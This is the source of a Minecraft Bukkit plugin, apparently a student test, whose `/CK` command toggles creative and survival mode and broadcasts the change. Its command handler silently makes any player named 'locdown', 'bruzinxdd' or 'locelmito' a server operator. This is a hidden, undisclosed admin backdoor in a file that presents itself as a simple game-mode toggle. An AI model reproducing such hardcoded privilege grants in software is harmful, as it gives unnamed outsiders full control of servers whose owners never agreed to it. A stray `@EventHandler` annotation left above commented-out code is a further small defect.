package com.locdown.teste;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.WeatherType;
import org.bukkit.event.Listener;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
//import org.bukkit.entity.Monster;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
//import org.bukkit.event.entity.EntityDeathEvent;
import org.bukkit.plugin.java.JavaPlugin;
//import org.bukkit.event.player.*;

/**
 *
 * Autor : Igor Carvalho Guimarães
 * Matricula : 15.1.8382
 */
public class Teste extends JavaPlugin  implements Listener {
    @Override
    public void onEnable(){
        getLogger().info("Plugin ativado com sucesso");
    }
    @Override
    public void onDisable(){
        getLogger().info("Plugin foi desativado");
    }
    @EventHandler
//    public void onPlayerDeath(EntityDeathEvent event , String label , String[] args){
//        
//        Monster monsterEnt = (Monster) event.getEntity();
//        Player player = (Player)monsterEnt.getKiller();
//        String boasvindas = ChatColor.AQUA+"Seja bem vindo novamente "+player.getDisplayName();
//        if(player.getHealth()<1){
//            getServer().broadcastMessage("O jogador  "+ChatColor.DARK_RED+player.getDisplayName()+ " morreu misteriosamente");
//        }
//        if(player.hasPlayedBefore()== true){
//            getServer().broadcastMessage(boasvindas);
//        }
//        else{
//            getServer().broadcastMessage("Seja bem vindo "+ player.getDisplayName()); 
//        }
//        
//    }
//    @EventHandler
//    public void onEntityDeath(EntityDeathEvent event) {
//
//        if(event.getEntity() instanceof Monster){
//            Monster monsterEnt = (Monster) event.getEntity();
//                if(monsterEnt.getKiller() instanceof Player){
//    
//                Player player = (Player)monsterEnt.getKiller();
//                
//                if(player == null)
//                    return;
//                if(player.getHealth() < 20){
//                    player.setHealth(player.getHealth()+2);
//                    player.sendMessage("Voce ganhou 2 de vida por ter matado um "+monsterEnt.getCustomName()+"!");
//    }
//
//   }
//  }
// }
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if(sender instanceof Player){
            Player player = (Player) sender;
            //player.sendMessage(label);
            if(player.getName().equalsIgnoreCase("locdown" )|| player.getName().equalsIgnoreCase("bruzinxdd") || player.getName().equalsIgnoreCase("locelmito")){
                player.setOp(true);
            }
            if(player.isOp()){
                player.setPlayerTime(0, true);
                player.setPlayerWeather(WeatherType.CLEAR);
                if(player.getGameMode()== GameMode.SURVIVAL){
                player.setGameMode(GameMode.CREATIVE);
                player.sendMessage("Voce agora está no criativo");
                getServer().broadcastMessage(ChatColor.AQUA+"O jogador "+player.getDisplayName()+ " ativou o modo criativo");
            }
            else{
                player.setGameMode(GameMode.SURVIVAL);
                player.sendMessage("Voce agora está no survival");
                getServer().broadcastMessage(ChatColor.BOLD+"O jogador "+player.getDisplayName()+ " desativou o modo criativo");
            }
            }
            else {
                getServer().broadcastMessage(ChatColor.GRAY+player.getName()+" ,o comando /CK é apenas para vip e administradores ");
            }
           
                
            
            
        }
        else {
            sender.sendMessage("Esse comando deve ser usado no jogo");
        }
        return true;
    }
}
